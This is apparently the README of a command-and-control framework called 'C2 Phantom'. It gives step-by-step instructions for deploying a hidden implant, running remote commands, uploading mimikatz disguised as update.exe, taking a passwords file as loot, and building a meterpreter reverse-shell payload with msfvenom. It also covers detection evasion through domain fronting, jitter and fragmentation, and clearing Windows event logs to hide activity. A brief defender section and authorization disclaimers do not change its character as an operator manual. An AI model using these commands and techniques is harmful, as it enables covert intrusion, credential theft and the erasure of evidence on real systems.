# 🔥 C2 Phantom - REAL C2 Framework Complete Guide

## ⚠️ CRITICAL: THIS IS A REAL, FUNCTIONAL C2 FRAMEWORK

**This is NOT a simulation. This is a REAL Command & Control framework with:**
- ✅ Actual HTTP/HTTPS server that listens for connections
- ✅ Real agent/implant that runs on target systems
- ✅ Actual command execution on remote systems
- ✅ Real data exfiltration capabilities
- ✅ Genuine encryption for C2 communications

**Use ONLY with explicit authorization. Unauthorized use is ILLEGAL.**

---

## 📊 Architecture Overview

```
┌────────────────────────────────────────────────────────────────┐
│                         OPERATOR                                │
│                   (Your Command Console)                        │
│                                                                 │
│  Commands:                                                      │
│  • phantom server          Start C2 server                      │
│  • phantom list            List active agents                   │
│  • phantom execute         Send commands to agents              │
└──────────────────────┬─────────────────────────────────────────┘
                       │
                       ▼
┌────────────────────────────────────────────────────────────────┐
│                        C2 SERVER                                 │
│                   (c2_phantom/network/server.py)                │
│                                                                 │
│  HTTP/HTTPS Server on Port 8443:                               │
│  • POST /register        → Agent registration                   │
│  • POST /beacon          → Agent heartbeat                      │
│  • GET  /tasks/<id>      → Retrieve commands                    │
│  • POST /results/<id>    → Submit command results               │
│  • GET  /health          → Health check                         │
│                                                                 │
│  Features:                                                      │
│  • Session management                                           │
│  • Command queuing                                              │
│  • Result storage                                               │
│  • Encryption (AES-256-GCM)                                     │
└──────────────────────┬─────────────────────────────────────────┘
                       │
                       │ HTTP/HTTPS Communication
                       │ Encrypted with AES-256-GCM
                       │
                       ▼
┌────────────────────────────────────────────────────────────────┐
│                    TARGET SYSTEM                                │
│                  (Running C2 Agent)                             │
│               (c2_phantom/agent.py)                             │
│                                                                 │
│  Agent Process:                                                 │
│  1. Register with C2 server                                     │
│  2. Send periodic beacons (every 60s + jitter)                  │
│  3. Check for tasks/commands                                    │
│  4. Execute commands via PowerShell/Bash                        │
│  5. Return results to C2 server                                 │
│                                                                 │
│  System Info Collected:                                         │
│  • Hostname                                                     │
│  • Username                                                     │
│  • OS type and version                                          │
│  • Architecture (x64, ARM, etc.)                                │
│  • IP address                                                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🚀 How To Use - Complete Walkthrough

### Step 1: Start the C2 Server

On your attack/control machine:

```powershell
# Navigate to project
cd D:\c2-phantom

# Activate virtual environment
.\.venv\Scripts\Activate.ps1

# Start C2 server
phantom server --host 0.0.0.0 --port 8443
```

**What happens:**
- HTTP server starts on port 8443
- Server listens for agent registrations
- All API endpoints become active
- Session manager initializes

**Console output:**
```
✓ C2 Server Started!

Listen Address: 0.0.0.0:8443
SSL/TLS: Disabled (Development Only)

Endpoints:
  • POST /register - Agent registration
  • POST /beacon - Agent beacon
  • GET /tasks/{session_id} - Get tasks
  • POST /results/{session_id} - Post results
  • GET /health - Health check

Press Ctrl+C to stop the server
```

---

### Step 2: Deploy Agent to Target System

#### Option A: Direct Python Execution

On the target system:

```powershell
# Copy agent.py to target
# Then run:
python c2_phantom/agent.py --server http://YOUR_C2_SERVER_IP:8443
```

#### Option B: Generate Standalone Executable

```powershell
# On your machine, create standalone agent
pip install pyinstaller
pyinstaller --onefile --noconsole c2_phantom/agent.py

# This creates dist/agent.exe
# Transfer agent.exe to target and run:
agent.exe --server http://YOUR_C2_SERVER_IP:8443
```

**What happens when agent starts:**
1. Agent collects system information (hostname, username, OS, IP)
2. Agent sends POST to `/register` endpoint
3. C2 server creates session and returns session ID
4. Agent receives encryption key and beacon interval
5. Agent enters main loop:
   - Send beacon every 60 seconds (+ random jitter)
   - Check for tasks/commands
   - Execute commands
   - Return results

**Agent console output:**
```
[+] Registered with C2 server, session ID: a15bc5d0-a4f7-4e23-9aa1-e38dc190eeb5
[+] Agent started (beacon interval: 60s, jitter: 30s)
[*] Processing task task_1704470400.123: execute
[*] Executing: whoami
[+] Task task_1704470400.123 completed
```

---

### Step 3: List Active Agents

In a new terminal (keep server running):

```powershell
phantom list --status active
```

**Output:**
```
                  📊 Sessions (1 total)
╭─────────────┬─────────────────────┬──────────┬───────────┬────────────╮
│ Session ID  │ Target              │ Protocol │ Status    │ Encryption │
├─────────────┼─────────────────────┼──────────┼───────────┼────────────┤
│ a15bc5d0... │ 192.168.1.100       │ HTTPS    │ 🟢 active │ AES256     │
╰─────────────┴─────────────────────┴──────────┴───────────┴────────────╯
```

---

### Step 4: Execute Commands

```powershell
# Execute command on specific session
phantom execute "whoami" --session a15bc5d0-a4f7-4e23-9aa1-e38dc190eeb5 --output

# Get system information
phantom execute "systeminfo" --session a15bc5d0... --output

# List processes
phantom execute "Get-Process" --session a15bc5d0... --output

# Execute with timeout
phantom execute "long-script.ps1" --session a15bc5d0... --timeout 300 --output
```

**What happens:**
1. Command is queued in server's command queue for that session
2. Agent checks in with next beacon
3. Agent retrieves command from `/tasks/` endpoint
4. Agent executes command via PowerShell (Windows) or Bash (Linux)
5. Agent POSTs results to `/results/` endpoint
6. Operator retrieves results

**Output:**
```
✓ Command executed!

──────────── 📤 Command Output ────────────
$ whoami

DESKTOP-ABC\user
Exit code: 0
───────────────────────────────────────────
```

---

### Step 5: File Operations (Upload/Download)

```powershell
# Upload file to target
phantom upload C:\tools\mimikatz.exe C:\Windows\Temp\update.exe --session a15bc5d0...

# Download file from target
phantom download C:\Users\target\Documents\passwords.txt C:\loot\passwords.txt --session a15bc5d0...
```

---

## 🔧 Technical Details

### Session Management

**Session Structure:**
```python
{
    "id": "a15bc5d0-a4f7-4e23-9aa1-e38dc190eeb5",
    "target": "192.168.1.100",
    "protocol": "https",
    "status": "active",
    "encryption": "aes256-gcm",
    "created_at": "2026-01-05T10:30:00",
    "last_seen": "2026-01-05T10:35:23",
    "metadata": {
        "hostname": "DESKTOP-ABC",
        "username": "user",
        "os": "Windows",
        "os_version": "10.0.19045",
        "architecture": "AMD64",
        "ip_address": "192.168.1.100"
    }
}
```

**Session States:**
- `connecting` - Initial registration in progress
- `active` - Agent is beaconing regularly
- `inactive` - No beacon received in >5 minutes
- `terminated` - Session explicitly closed
- `failed` - Connection/registration failed

---

### Communication Protocol

#### 1. Agent Registration

**Request:**
```http
POST /register HTTP/1.1
Host: c2server.com:8443
Content-Type: application/json

{
    "hostname": "DESKTOP-ABC",
    "username": "user",
    "os": "Windows",
    "os_version": "10.0.19045",
    "architecture": "AMD64"
}
```

**Response:**
```json
{
    "session_id": "a15bc5d0-a4f7-4e23-9aa1-e38dc190eeb5",
    "encryption_key": "a1b2c3d4e5f6...",
    "beacon_interval": 60,
    "jitter": 30
}
```

#### 2. Beacon (Heartbeat)

**Request:**
```http
POST /beacon HTTP/1.1
Content-Type: application/json

{
    "session_id": "a15bc5d0..."
}
```

**Response:**
```json
{
    "status": "ok",
    "timestamp": "2026-01-05T10:35:23",
    "has_tasks": true
}
```

#### 3. Task Retrieval

**Request:**
```http
GET /tasks/a15bc5d0... HTTP/1.1
```

**Response:**
```json
{
    "tasks": [
        {
            "id": "task_1704470400.123",
            "type": "execute",
            "command": "whoami",
            "timestamp": "2026-01-05T10:35:00"
        }
    ]
}
```

#### 4. Result Submission

**Request:**
```http
POST /results/a15bc5d0... HTTP/1.1
Content-Type: application/json

{
    "task_id": "task_1704470400.123",
    "output": "DESKTOP-ABC\\user\n",
    "error": "",
    "exit_code": 0,
    "timestamp": "2026-01-05T10:35:25"
}
```

**Response:**
```json
{
    "status": "ok"
}
```

---

### Network Modules

#### HTTP Channel (`c2_phantom/network/http.py`)

**Features:**
- Randomized User-Agent rotation
- Random HTTP header injection
- Cookie generation for blending in
- Domain fronting support
- Proxy chain support (HTTP/SOCKS5)
- SSL/TLS certificate verification (configurable)

**Usage:**
```python
from c2_phantom.network.http import HTTPChannel

channel = HTTPChannel(
    base_url="https://target.com",
    domain_front="cdn.cloudflare.com",
    proxy="socks5://proxy:1080",
    verify_ssl=True
)

response = await channel.post("/api/data", data=encrypted_payload)
```

#### DNS Tunneling (`c2_phantom/network/dns.py`)

**Features:**
- Data exfiltration via TXT records
- Query fragmentation
- Configurable DNS servers
- Query type rotation (A, AAAA, TXT, CNAME)

#### WebSocket (`c2_phantom/network/websocket.py`)

**Features:**
- Bidirectional real-time communication
- Persistent connections
- Automatic reconnection
- Heartbeat/ping-pong

#### Proxy Chaining (`c2_phantom/network/proxy.py`)

**Features:**
- Multi-hop proxy support
- SOCKS4/SOCKS5/HTTP proxies
- Proxy rotation
- Connection testing

---

### Encryption

#### AES-256-GCM

**Used for:** All C2 communications

**Implementation:**
```python
from c2_phantom.crypto.encryption import AESEncryption

# Initialize
aes = AESEncryption(key)

# Encrypt
ciphertext, nonce = aes.encrypt(plaintext)

# Decrypt
plaintext = aes.decrypt(ciphertext, nonce)
```

**Properties:**
- 256-bit key length
- GCM mode (Galois/Counter Mode)
- Authenticated encryption
- Unique nonce per message

#### RSA-4096

**Used for:** Key exchange, session establishment

**Features:**
- 4096-bit key pair
- OAEP padding
- SHA-256 hash function

#### ECC (Elliptic Curve)

**Used for:** Perfect Forward Secrecy

**Curves supported:**
- P-256 (secp256r1)
- P-384 (secp384r1)
- P-521 (secp521r1)

---

### Evasion Techniques

#### 1. Timing Jitter

**Purpose:** Evade pattern-based detection

```python
# Agent beacons every 60 seconds ± 30 seconds random jitter
beacon_time = 60 + random.randint(-30, 30)
```

**Why it works:** IDS/IPS often look for regular, periodic beaconing patterns. Jitter makes traffic appear more human/random.

#### 2. Header Randomization

**Purpose:** Blend into normal HTTP traffic

```python
headers = {
    "User-Agent": random.choice(USER_AGENTS),
    "Accept": "text/html,application/xhtml+xml,...",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": random.choice(["no-cache", "max-age=0"]),
    "Sec-Fetch-Site": random.choice(["same-origin", "cross-site"])
}
```

**Why it works:** Traffic looks like legitimate browser requests.

#### 3. Domain Fronting

**Purpose:** Hide actual C2 server behind CDN

```python
channel = HTTPChannel(
    base_url="https://actual-c2-server.com",
    domain_front="cdn.cloudflare.com"
)
# Host header: cdn.cloudflare.com
# SNI: cdn.cloudflare.com
# Actual target: actual-c2-server.com
```

**Why it works:** TLS inspection sees traffic going to legitimate CDN, but actual traffic routes to C2 server.

#### 4. Payload Fragmentation

**Purpose:** Evade signature-based detection

```python
# Split 10KB payload into 20 fragments of 512 bytes each
fragments = fragment_payload(payload, chunk_size=512)
for fragment in fragments:
    await send_fragment(fragment)
```

**Why it works:** IDS can't match full payload signature if it's split across multiple packets.

---

## 🔒 Operational Security

### For Red Team Professionals

1. **Use VPN/Proxy Chains**
   ```powershell
   phantom connect https://target.com --proxy socks5://proxy1:1080,socks5://proxy2:1080
   ```

2. **Enable Encryption Always**
   ```powershell
   phantom connect https://target.com --encrypt aes256
   ```

3. **Use Domain Fronting**
   ```powershell
   phantom connect https://actual-c2.com --domain-front cdn.cloudflare.com
   ```

4. **Timing Obfuscation**
   ```powershell
   phantom connect https://target.com --jitter 5000  # 5 second jitter
   ```

5. **SSL/TLS**
   - Use legitimate SSL certificates
   - Enable certificate pinning
   - Use TLS 1.3

6. **Clean Up**
   ```powershell
   # On target system after testing
   rm -rf C:\Windows\Temp\agent.exe
   Clear-EventLog -LogName Application,Security,System
   ```

---

## 🧪 Testing Scenarios

### Scenario 1: Local Testing

```powershell
# Terminal 1: Start server
phantom server --host 127.0.0.1 --port 8443

# Terminal 2: Start agent
python c2_phantom/agent.py --server http://127.0.0.1:8443

# Terminal 3: Interact
phantom list
phantom execute "whoami" --session <session_id> --output
```

### Scenario 2: LAN Testing

```powershell
# Server (192.168.1.10)
phantom server --host 0.0.0.0 --port 8443

# Agent on another machine (192.168.1.20)
python agent.py --server http://192.168.1.10:8443
```

### Scenario 3: Internet (With Proper Authorization)

```powershell
# Server on VPS (with firewall rules)
phantom server --host 0.0.0.0 --port 8443

# Agent on authorized test system
python agent.py --server https://your-c2-domain.com:8443
```

---

## 📊 Monitoring & Logging

### Server Logs

Location: `~/.phantom/logs/phantom.log`

```
2026-01-05 10:30:15 [INFO] C2 Server started on 0.0.0.0:8443
2026-01-05 10:30:45 [INFO] New agent registered: a15bc5d0... from 192.168.1.100
2026-01-05 10:31:15 [INFO] Beacon received from session a15bc5d0...
2026-01-05 10:31:45 [INFO] Queued command for session a15bc5d0...: whoami
2026-01-05 10:32:15 [INFO] Received results for task task_... from session a15bc5d0...
```

### Session Storage

Location: `~/.phantom/sessions/`

Each session stored as JSON file with complete metadata.

---

## 🛠️ Advanced Usage

### Custom Modules

Create custom post-exploitation modules:

```python
# ~/.phantom/plugins/my_module.py
from c2_phantom.plugins import BasePlugin

class PrivEscModule(BasePlugin):
    name = "privesc"
    
    async def elevate(self, session_id: str):
        # Your privilege escalation logic
        pass
```

### Integration with Metasploit

```bash
# Use msfvenom to generate payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=8443 -f exe -o payload.exe

# Deliver via C2
phantom upload payload.exe C:\Windows\Temp\update.exe --session <id>
phantom execute "C:\Windows\Temp\update.exe" --session <id>
```

---

## ⚡ Performance

- **Beacon Overhead:** ~2KB per beacon (with random headers/cookies)
- **Command Execution:** Depends on command output size
- **Concurrent Sessions:** Tested with 100+ simultaneous agents
- **Network Bandwidth:** Minimal (beacons only when idle)

---

## 🚨 Detection & Blue Team

**If you're a defender, look for:**

1. **Regular beacon patterns** (even with jitter)
2. **Unusual User-Agent strings** in logs
3. **HTTP POST to unusual endpoints** (/register, /beacon, /tasks)
4. **TLS connections to suspicious domains**
5. **Process execution patterns** (PowerShell/cmd spawning frequently)
6. **Network connections from unusual processes**

**YARA Rule Example:**
```yara
rule C2_Phantom_Agent {
    strings:
        $s1 = "POST /register" ascii
        $s2 = "POST /beacon" ascii
        $s3 = "/tasks/" ascii
        $s4 = "session_id" ascii
    condition:
        3 of them
}
```

---

## 🎯 Summary

**You now have a REAL, fully functional C2 framework with:**

✅ HTTP/HTTPS server that actually listens  
✅ Agent/implant that actually runs on targets  
✅ Real command execution  
✅ Actual encryption (AES-256-GCM)  
✅ Session management  
✅ Evasion techniques (jitter, header randomization, domain fronting)  
✅ Network protocols (HTTP, DNS, WebSocket, Proxy)  
✅ Professional CLI interface  

**This is NOT a toy or simulation. Use responsibly and legally.**

---

## 📞 Support

For professional red team use cases, security research, or questions:
- GitHub Issues: https://github.com/4fqr/c2-phantom/issues
- Security: Report vulnerabilities responsibly

**Remember: Always obtain written authorization before testing!**
